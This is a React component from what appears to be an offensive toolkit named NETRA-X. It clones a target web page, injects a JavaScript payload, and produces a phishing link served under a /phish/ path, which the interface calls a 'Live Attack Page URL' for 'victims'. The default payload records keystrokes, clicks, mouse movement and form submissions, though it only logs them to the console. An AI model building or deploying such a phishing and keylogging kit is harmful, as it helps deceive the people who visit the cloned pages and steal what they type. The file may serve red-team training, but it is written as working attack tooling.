
'use client';

import { useState } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import Link from 'next/link';
import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Textarea } from '@/components/ui/textarea';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { Loader2, Wand, Share2, Clipboard, Globe } from 'lucide-react';
import { clonePageFromUrl } from '@/ai/flows/clone-page-from-url-flow';
import { useAuth } from '@/hooks/use-auth';
import { logActivity } from '@/services/activity-log-service';
import { Label } from '@/components/ui/label';

const formSchema = z.object({
  targetUrl: z.string().url({ message: 'Please enter a valid URL.' }),
  jsPayload: z.string().min(1, 'JavaScript Payload cannot be empty.'),
});

const defaultJsPayload = `
// This script logs various user interactions to the browser console.
// Open the developer console on the target page to see the output.
(function() {
    console.log('[NETRA-X] Advanced monitoring script injected.');

    // --- Mouse Movement ---
    let lastMove = 0;
    document.addEventListener('mousemove', (e) => {
        const now = Date.now();
        if (now - lastMove > 100) { // Throttle logging to every 100ms
            console.log(\`[Mouse Move] X: \${e.clientX}, Y: \${e.clientY}\`);
            lastMove = now;
        }
    });

    // --- Clicks ---
    document.addEventListener('click', (e) => {
        console.log(\`[Click] Tag: \${e.target.tagName}, ID: \${e.target.id || 'none'}, Class: \${e.target.className || 'none'}\`);
    }, true);

    // --- Keystrokes ---
    document.addEventListener('keydown', (e) => {
        // Avoid logging passwords if we can identify the input type
        if (e.target.type === 'password') {
             console.log('[Keystroke] In a password field.');
        } else {
             console.log(\`[Keystroke] Key: "\${e.key}" in field: \${e.target.name || e.target.id || 'unknown'}\`);
        }
    });

     // --- Form Submissions ---
     document.addEventListener('submit', (e) => {
        console.log('[Form Submit] Intercepted submission for form:', e.target);
    }, true);

})();
`;

export function AdvancedPageCloner() {
  const { toast } = useToast();
  const { user } = useAuth();
  
  const [modifiedHtml, setModifiedHtml] = useState<string | null>(null);
  const [hostedUrl, setHostedUrl] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [isHosting, setIsHosting] = useState(false);

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      targetUrl: 'https://google.com',
      jsPayload: defaultJsPayload.trim(),
    },
  });

  const processAndInject = async (values: z.infer<typeof formSchema>) => {
    setIsLoading(true);
    setModifiedHtml(null);
    setHostedUrl(null);

    try {
      toast({ title: 'Cloning Page...', description: 'Fetching DOM from the target URL.' });
      const response = await clonePageFromUrl({ url: values.targetUrl });
      let html = response.htmlContent;
      
      const scriptToInject = `<script>${values.jsPayload}</script>`;
      
      if (html.includes('</body>')) {
          html = html.replace(/<\/body>/i, `${scriptToInject}</body>`);
      } else {
          html += scriptToInject;
      }
      
      setModifiedHtml(html);
      toast({ title: 'Injection Complete', description: 'JavaScript payload has been injected.' });
    } catch (e) {
      const error = e instanceof Error ? e.message : 'An unknown error occurred';
      toast({ variant: 'destructive', title: 'Cloning Failed', description: error });
    } finally {
      setIsLoading(false);
    }
  };

  const handleGenerateLink = async () => {
    if (!modifiedHtml) return;
    setIsHosting(true);
    setHostedUrl(null);
    
    try {
        const pageId = crypto.randomUUID();
        const pageStorageKey = `phishing-html-${pageId}`;
        localStorage.setItem(pageStorageKey, modifiedHtml);

        const finalUrl = `${window.location.origin}/phish/${pageId}`;
        setHostedUrl(finalUrl);
        toast({ title: "Local Link Generated!", description: "Your advanced attack page is ready." });

        logActivity({
            user: user?.displayName || 'Operator',
            action: 'Created Advanced Cloned Page',
            details: `Target: ${form.getValues('targetUrl')}`,
        });
    } catch(err) {
        const error = err instanceof Error ? err.message : "An unknown error occurred";
        toast({ variant: 'destructive', title: 'Hosting Failed', description: error });
    } finally {
        setIsHosting(false);
    }
  };

  return (
    <Card>
      <CardHeader>
        <CardTitle>Advanced Webpage Cloner (with JS Injection)</CardTitle>
        <CardDescription>Clone a page and inject a custom JavaScript payload to monitor real-time user interactions.</CardDescription>
      </CardHeader>
      <CardContent>
        <Form {...form}>
          <form onSubmit={form.handleSubmit(processAndInject)} className="space-y-4">
             <FormField
              control={form.control}
              name="targetUrl"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Target URL</FormLabel>
                  <FormControl>
                    <Input placeholder="https://example.com" {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <FormField
              control={form.control}
              name="jsPayload"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>JavaScript Payload to Inject</FormLabel>
                  <FormControl>
                    <Textarea placeholder="// Your custom JS code here..." {...field} className="font-mono h-48"/>
                  </FormControl>
                   <CardDescription>The output of this script will appear in the developer console of the victim's browser on the generated page.</CardDescription>
                  <FormMessage />
                </FormItem>
              )}
            />
            <div className="flex flex-col sm:flex-row gap-2">
                <Button type="submit" disabled={isLoading} className="w-full sm:w-auto">
                    {isLoading ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Wand className="mr-2 h-4 w-4" />}
                    Clone & Inject JS
                </Button>
                <Button type="button" onClick={handleGenerateLink} disabled={!modifiedHtml || isHosting} className="w-full sm:w-auto">
                    {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Share2 className="mr-2 h-4 w-4" />}
                    Generate Local Link
                </Button>
            </div>
          </form>
        </Form>
      </CardContent>
      {hostedUrl && (
          <CardFooter className="flex-col items-start gap-4 border-t pt-6">
            <h3 className="font-semibold">Live Attack Page URL</h3>
            <div className="w-full flex items-center gap-2">
                <Input readOnly value={hostedUrl} className="font-mono" />
                <Button type="button" size="icon" variant="outline" onClick={() => {
                    navigator.clipboard.writeText(hostedUrl);
                    toast({ title: 'Copied!'});
                }}>
                    <Clipboard className="h-4 w-4" />
                </Button>
                 <Button type="button" size="icon" variant="outline" asChild>
                    <Link href={hostedUrl} target="_blank"><Globe className="h-4 w-4" /></Link>
                </Button>
            </div>
          </CardFooter>
      )}
    </Card>
  );
}
